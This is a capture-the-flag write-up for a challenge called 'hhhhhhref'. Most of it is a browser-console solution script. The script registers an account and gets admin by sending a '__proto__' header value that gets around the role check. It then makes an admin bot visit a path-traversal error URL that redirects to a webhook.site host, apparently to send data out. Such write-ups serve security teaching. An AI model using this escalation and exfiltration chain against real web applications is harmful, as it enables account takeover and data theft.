## hhhhhhref

Are they specifications or are they vulnerabilities? What do you think?

Solution:

```py
// Run in browser console
const username = `balls${Math.round(Math.random()*10000)}`;
const password = "11";
const errorCode = `../../%0A/webhook.site/c8b23d0f-6d61-42ac-84ba-3dc3fd02c658`.replaceAll("-", "%2D");

// Register
await fetch(`/api/auth/register`, {
  "headers": {
    "content-type": "application/json",
  },
  "body": JSON.stringify({ name: username, password}),
  "method": "POST",
}).then(res => res.text());

// Login and escalate to admin
await fetch(`/api/auth/callback/credentials`, {
  "headers": {
    "content-type": "application/x-www-form-urlencoded",
    "x-user-token-key": "__proto__",
    "x-user-token-value": "{}", // Not global prototype pollution, just makes Object.keys() return only 2, bypassing the role check
  },
  "body": new URLSearchParams({
    csrfToken: JSON.parse(await fetch(`/api/auth/csrf`).then(res => res.text())).csrfToken,
    name: username,
    password
  }),
  "method": "POST",
});

// Tell bot to log in as admin and visit page
await fetch(`/api/bot/crawl`, {
  "headers": {
    "content-type": "application/json"
  },
  "body": JSON.stringify({ name: username, password, errorCode }),
  "method": "POST",
});
``` 

Another solution:

https://gist.github.com/as3617/cadbf23459f85d8064aeefca75fff7e3
